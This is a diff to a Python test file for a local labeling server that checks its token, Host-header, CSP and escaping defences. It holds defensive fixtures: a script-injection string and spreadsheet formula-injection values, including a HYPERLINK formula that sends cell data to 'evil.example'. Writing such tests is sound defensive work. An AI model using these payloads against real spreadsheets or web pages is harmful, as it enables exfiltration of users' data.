@@ -1,23 +1,41 @@
-"""`judgekeeper label`: a local labeling page on 127.0.0.1, writing the template's CSV shape."""
+"""The labeling server `judgekeeper start` builds on (label.py): a local page on 127.0.0.1, its
+security (token, Host check, CSP) and the labels CSV it writes on every click.
+
+`start` gives the session its page data and progress (start_label.StartSession); here a small
+session does the same, so the shared parts are tested on their own."""
 
 import csv
 import http.client
 import json
 import os
-import queue
-import signal
-import subprocess
-import sys
 import threading
-import urllib.request
 from pathlib import Path
 
 import pytest
 
 from judgekeeper import label as label_mod
-from judgekeeper.anchors import load_verified
-from judgekeeper.cli import main
 from judgekeeper.label import LabelError, LabelServer, LabelSession
+
+# A page as the caller passes it: the server fills in the nonce, the token and the data.
+PAGE = ('<!doctype html><title>labels</title>'
+        '<script type="application/json" id="data">__DATA__</script>'
+        '<script nonce="__NONCE__">var TOKEN = "__TOKEN__";</script>')
+
+
+class Session(LabelSession):
+    """The page data and the progress, as a caller adds them (start_label.StartSession)."""
+
+    def summary(self):
+        return {"n_items": len(self.items),
+                "n_labeled": sum(1 for i in self.items if i["label"]),
+                "n_deferred": sum(1 for i in self.items if i["deferred"]),
+                "done": all(i["label"] or i["deferred"] for i in self.items)}
+
+    def state(self):
+        start = next((n for n, i in enumerate(self.items)
+                      if not i["label"] and not i["deferred"]), 0)
+        return {"kind": self.kind, "labels": list(self.labels), "items": self.items,
+                "start": start, "summary": self.summary()}
 
 
 def _items(tmp_path, n=4, pairwise=False, extra=None):
@@ -72,7 +90,7 @@ def serve():
     started = []
 
     def start(items, out, **kw):
-        server = LabelServer(LabelSession(items, out), port=0)
+        server = LabelServer(Session(items, out), port=0, page=PAGE)
         thread = threading.Thread(target=server.serve, kwargs=kw, daemon=True)
         thread.start()
         started.append((server, thread))
@@ -102,7 +120,8 @@ def test_page_is_self_contained(tmp_path, serve):
         assert external not in page
     csp = resp.getheader("Content-Security-Policy")
     assert "default-src 'none'" in csp and "connect-src 'self'" in csp
-    assert "show judge" in page.lower()
+    nonce = csp.split("'nonce-")[1].split("'")[0]
+    assert f'nonce="{nonce}"' in page and client.server.token in page
 
 
 def test_every_request_needs_the_token(tmp_path, serve):
@@ -133,7 +152,7 @@ def test_host_header_must_be_the_bound_address(tmp_path, serve, host):
     assert not out.exists()
 
 
-def test_labels_are_written_immediately_in_the_template_shape(tmp_path, serve):
+def test_labels_are_written_immediately(tmp_path, serve):
     out = tmp_path / "labels.csv"
     client = serve(_items(tmp_path), out)
     client.label(id="it0", label="pass")
@@ -146,7 +165,6 @@ def test_labels_are_written_immediately_in_the_template_shape(tmp_path, serve):
     assert rows[1]["notes"] == "wrong unit" and rows[1]["output"] == "answer 1"
     s = state["summary"]
     assert s["n_items"] == 4 and s["n_labeled"] == 2 and s["n_deferred"] == 0
-    assert s["progress"] == "2 of 4 labeled, 0 deferred"
 
 
 def test_undo_clears_a_label(tmp_path, serve):
@@ -191,24 +209,19 @@ def test_reopening_resumes(tmp_path, serve):
     client.label(id="it1", label="fail")
     client.server.stop()
 
-    session = LabelSession(items, out)
+    session = Session(items, out)
     state = session.state()
     assert [i["label"] for i in state["items"]] == ["pass", "fail", None, None]
     assert state["items"][0]["note"] == "ok"
     assert state["start"] == 2  # the first item still to label
-    assert state["summary"]["progress"] == "2 of 4 labeled, 0 deferred"
+    assert state["summary"]["n_labeled"] == 2
 
 
 def test_resume_reads_spreadsheet_spellings(tmp_path):
     items, out = _items(tmp_path, n=2), tmp_path / "labels.csv"
-    main(["template", str(items), "-o", str(out)])
-    rows = _read(out)
-    rows[0]["human_label"] = "Yes"
-    with out.open("w", newline="", encoding="utf-8") as f:
-        w = csv.DictWriter(f, fieldnames=list(rows[0]))
-        w.writeheader()
-        w.writerows(rows)
-    state = LabelSession(items, out).state()
+    out.write_text("id,input,output,human_label,notes\nit0,question 0,answer 0,Yes,\n"
+                   "it1,question 1,answer 1,,\n", encoding="utf-8")
+    state = Session(items, out).state()
     assert [i["label"] for i in state["items"]] == ["pass", None]
 
 
@@ -224,7 +237,7 @@ def test_deferred_items_stay_unlabeled(tmp_path, serve):
     client = serve(_items(tmp_path), out)
     status, state = client.label(id="it2", deferred=True)
     assert status == 200
-    assert state["summary"]["progress"] == "0 of 4 labeled, 1 deferred"
+    assert state["summary"]["n_labeled"] == 0 and state["summary"]["n_deferred"] == 1
     assert all(r["human_label"] == "" for r in _read(out))
     status, state = client.label(id="it2", label="fail")  # labeling clears the deferral
     assert state["summary"]["n_deferred"] == 0 and state["summary"]["n_labeled"] == 1
@@ -240,33 +253,6 @@ def test_bad_requests(tmp_path, serve):
     assert resp.status == 404
 
 
-def test_done_summary(tmp_path, serve):
-    out = tmp_path / "labels.csv"
-    client = serve(_items(tmp_path), out)
-    for i, lab in enumerate(["pass", "pass", "pass"]):
-        client.label(id=f"it{i}", label=lab)
-    _, state = client.label(id="it3", deferred=True)
-    s = state["summary"]
-    assert s["done"] is True
-    assert s["distribution"] == {"pass": 3}
-    messages = " ".join(s["warnings"])
-    assert "Only 3 labeled items" in messages and "more lopsided than 80/20" in messages
-    assert s["next_command"] == f"judgekeeper import-labels {out} -o anchors.jsonl"
-
-
-def test_output_reads_with_import_labels(tmp_path, serve):
-    out = tmp_path / "labels.csv"
-    client = serve(_items(tmp_path), out)
-    for i, lab in enumerate(["pass", "fail", "pass"]):
-        client.label(id=f"it{i}", label=lab)
-    client.label(id="it3", deferred=True)
-    anchors = tmp_path / "anchors.jsonl"
-    assert main(["import-labels", str(out), "-o", str(anchors)]) == 0
-    items, manifest = load_verified(anchors)
-    assert [i["id"] for i in items] == ["it0", "it1", "it2"]
-    assert manifest["label_distribution"] == {"fail": 1, "pass": 2}
-
-
 def test_pairwise_records_a_and_b(tmp_path, serve):
     out = tmp_path / "labels.csv"
     client = serve(_items(tmp_path, n=2, pairwise=True), out)
@@ -279,18 +265,6 @@ def test_pairwise_records_a_and_b(tmp_path, serve):
     rows = _read(out)
     assert list(rows[0]) == ["id", "input", "output_a", "output_b", "human_label", "notes"]
     assert [r["human_label"] for r in rows] == ["A", "B"]
-    anchors = tmp_path / "anchors.jsonl"
-    assert main(["import-labels", str(out), "-o", str(anchors)]) == 0
-    assert [i["human_label"] for i in load_verified(anchors)[0]] == ["A", "B"]
-
-
-def test_judge_verdict_is_carried_but_hidden_by_default(tmp_path, serve):
-    items = _items(tmp_path, extra={"verdict": "pass", "reason": "looks right"})
-    client = serve(items, tmp_path / "labels.csv")
-    item = client.state()["items"][0]
-    assert item["judge"] == {"verdict": "pass", "reason": "looks right"}
-    _, payload = client.request("GET", "/")
-    assert 'id="judge" hidden' in payload.decode()
 
 
 def test_strings_are_escaped(tmp_path, serve):
@@ -303,7 +277,6 @@ def test_strings_are_escaped(tmp_path, serve):
     page = payload.decode()
     assert "alert(1)" in page  # the item is in the page...
     assert "<script>alert" not in page and "</script><script>" not in page  # ...but inert
-    assert ".innerHTML" not in page  # every displayed string goes through textContent
     resp, payload = client.request("GET", "/state")
     assert resp.getheader("Content-Type").startswith("application/json")
     assert resp.getheader("X-Content-Type-Options") == "nosniff"
@@ -311,106 +284,18 @@ def test_strings_are_escaped(tmp_path, serve):
 
 
 def test_server_exits_when_idle(tmp_path):
-    server = LabelServer(LabelSession(_items(tmp_path), tmp_path / "labels.csv"), port=0)
+    server = LabelServer(Session(_items(tmp_path), tmp_path / "labels.csv"), port=0, page=PAGE)
     thread = threading.Thread(target=server.serve, kwargs={"idle_timeout": 0.3}, daemon=True)
     thread.start()
     thread.join(timeout=5)
     assert not thread.is_alive()
 
 
-def test_cli_label(tmp_path, monkeypatch, capsys):
-    monkeypatch.setattr(label_mod, "IDLE_TIMEOUT", 0.3)
-    opened = []
-    monkeypatch.setattr(label_mod.webbrowser, "open", lambda url: opened.append(url))
-    out = tmp_path / "labels.csv"
-    assert main(["label", str(_items(tmp_path)), "--out", str(out), "--port", "0",
-                 "--no-browser"]) == 0
-    printed = capsys.readouterr().out
-    assert "http://127.0.0.1:" in printed and "token=" in printed
-    assert opened == []
-    assert main(["label", str(_items(tmp_path)), "--out", str(out), "--port", "0"]) == 0
-    assert len(opened) == 1 and opened[0].startswith("http://127.0.0.1:")
-
-
-def test_cli_label_prints_its_link_at_once_when_stdout_is_a_pipe(tmp_path):
-    """Started in the background or piped to a log, stdout is not a terminal. The link carries
-    the token, so it must be readable while the command is still running."""
-    out = tmp_path / "labels.csv"
-    env = {k: v for k, v in os.environ.items() if k != "PYTHONUNBUFFERED"}
-    proc = subprocess.Popen(
-        [sys.executable, "-m", "judgekeeper.cli", "label", str(_items(tmp_path)), "--out",
-         str(out), "--port", "0", "--no-browser"],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env)
-    lines: queue.Queue = queue.Queue()
-    reader = threading.Thread(target=lambda: [lines.put(x) for x in proc.stdout], daemon=True)
-    reader.start()
-    try:
-        started = []
-        try:
-            while len(started) < 3:  # the three start-up lines
-                started.append(lines.get(timeout=15).rstrip("\n"))
-        except queue.Empty:
-            pytest.fail(f"start-up lines not written while running; got {started}")
-        assert proc.poll() is None, "the command is still running"
-        assert started[0].startswith("labeling 4 single items into ")
-        (link,) = [x.removeprefix("open ") for x in started if x.startswith("open ")]
-        assert link.startswith("http://127.0.0.1:") and "/?token=" in link
-        assert "Ctrl-C" in started[2]
-        with urllib.request.urlopen(link, timeout=5) as resp:  # the printed link opens the page
-            assert resp.status == 200 and b"judgekeeper label" in resp.read()
-    finally:
-        if sys.platform == "win32":  # Windows cannot send SIGINT to a child: stop it outright
-            proc.terminate()
-        else:
-            proc.send_signal(signal.SIGINT)
-        try:
-            proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:  # SIGINT is ignored when pytest itself runs detached
-            proc.kill()
-            proc.wait(timeout=5)
-        reader.join(timeout=5)
-
-
-def _run_and_stop(tmp_path, monkeypatch, out, during=None):
-    """Run the command in this process until it is idle; the lines it printed."""
-    monkeypatch.setattr(label_mod, "IDLE_TIMEOUT", 0.3)
-    printed = []
-    if during is not None:
-        original = label_mod.LabelServer.serve
-
-        def serve(self, idle_timeout=None):
-            thread = threading.Thread(target=original, args=(self, idle_timeout), daemon=True)
-            thread.start()
-            during(Client(self))
-            thread.join(timeout=5)
-
-        monkeypatch.setattr(label_mod.LabelServer, "serve", serve)
-    label_mod.run(_items(tmp_path), out, port=0, open_browser=False, print_fn=printed.append)
-    return printed
-
-
-def test_stopping_with_nothing_labeled_does_not_point_at_a_file(tmp_path, monkeypatch):
-    out = tmp_path / "labels.csv"
-    printed = _run_and_stop(tmp_path, monkeypatch, out)
-    assert not out.exists()
-    assert printed[-1] == "stopped: nothing was labeled, so no file was written"
-    assert "labels in" not in "\n".join(printed) and "next:" not in "\n".join(printed)
-
-
-def test_stopping_with_labels_names_the_file_and_the_next_command(tmp_path, monkeypatch):
-    out = tmp_path / "labels.csv"
-    printed = _run_and_stop(tmp_path, monkeypatch, out,
-                            during=lambda client: client.label(id="it0", label="pass"))
-    assert out.is_file()
-    assert printed[-2] == f"stopped: 1 of 4 labeled, 0 deferred; labels in {out}"
-    assert printed[-1].startswith("next: judgekeeper import-labels ")
-
-
-def test_cli_label_bad_items_is_usage_error(tmp_path, capsys):
+def test_items_without_an_output_are_refused(tmp_path):
     path = tmp_path / "items.jsonl"
     path.write_text(json.dumps({"id": "x", "input": "q"}) + "\n", encoding="utf-8")
-    assert main(["label", str(path), "--no-browser", "--port", "0"]) == 2
-    assert "output" in capsys.readouterr().err
+    with pytest.raises(LabelError, match="output"):
+        LabelSession(path, tmp_path / "labels.csv")
 
 
 # --- spreadsheet formula injection (security audit item 5) -------------------------------------
@@ -426,12 +311,12 @@ def test_written_sheet_neutralises_formula_prefixes(tmp_path, serve):
     row = _read(out)[0]
     assert (row["input"], row["output"], row["notes"]) == ("'=1+1", "'@cmd", "'-not a formula")
     client.server.stop()
-    first = LabelSession(items, out).state()["items"][0]
+    first = Session(items, out).state()["items"][0]
     # The quote is only in the file; what the browser shows is the original text.
     assert (first["input"], first["output"], first["note"]) == ("=1+1", "@cmd", "-not a formula")
 
 
-def test_formula_ids_are_guarded_and_survive_resume_and_import(tmp_path, serve):
+def test_formula_ids_are_guarded_and_survive_resume(tmp_path, serve):
     """Security review, finding 1: the id column is a cell like any other."""
     ids = ('=HYPERLINK("http://evil.example/?x="&A1,"click")', "+1+1", "-2", "@SUM(1)",
            "\ttab", "\rcr")
@@ -451,12 +336,10 @@ def test_formula_ids_are_guarded_and_survive_resume_and_import(tmp_path, serve):
     resumed = LabelSession(items, out)  # the guarded ids are recognised, not "unknown ids"
     assert [(i["id"], i["label"]) for i in resumed.items] == [(i, "pass") for i in known]
     resumed.update({"id": known[0], "label": "fail"})
-    anchors = tmp_path / "anchors.jsonl"
-    assert main(["import-labels", str(out), "-o", str(anchors)]) == 0
-    loaded, _ = load_verified(anchors)
-    assert [i["id"] for i in loaded] == known
+    again = LabelSession(items, out)
+    assert [i["id"] for i in again.items] == known
     assert known[:4] == list(ids[:4])
-    assert loaded[0]["human_label"] == "fail"
+    assert again.items[0]["label"] == "fail"
 
 
 def test_idle_connection_does_not_freeze_the_server(tmp_path, serve, monkeypatch):
@@ -479,8 +362,8 @@ def test_idle_connection_does_not_freeze_the_server(tmp_path, serve, monkeypatch
 # Stopping by itself once the result is served (the page `judgekeeper start` passes)
 
 def _serve_until_done(tmp_path, **kw):
-    server = LabelServer(LabelSession(_items(tmp_path, n=3), tmp_path / "labels.csv"), port=0,
-                         **kw)
+    server = LabelServer(Session(_items(tmp_path, n=3), tmp_path / "labels.csv"), port=0,
+                         page=PAGE, **kw)
     thread = threading.Thread(target=server.serve, daemon=True)
     thread.start()
     return server, thread, Client(server)
@@ -529,7 +412,7 @@ def test_with_a_result_it_stops_anyway_when_nobody_fetches_it(tmp_path, monkeypa
     assert not thread.is_alive()
 
 
-def test_plain_label_keeps_serving_when_done(tmp_path):
+def test_without_a_result_it_keeps_serving_when_done(tmp_path):
     server, thread, client = _serve_until_done(tmp_path)
     for n in range(3):
         assert client.label(id=f"it{n}", label="pass")[0] == 200
@@ -539,11 +422,9 @@ def test_plain_label_keeps_serving_when_done(tmp_path):
     thread.join(timeout=5)
 
 
-def test_plain_label_keeps_its_own_page_and_has_no_result(tmp_path):
+def test_without_a_result_there_is_no_result_page(tmp_path):
     server, thread, client = _serve_until_done(tmp_path)
     try:
-        page = server.page()[0]
-        assert "Defer" in page and "Show judge" in page and "See my result" not in page
         assert client.request("GET", "/result")[0].status == 404
     finally:
         server.stop()
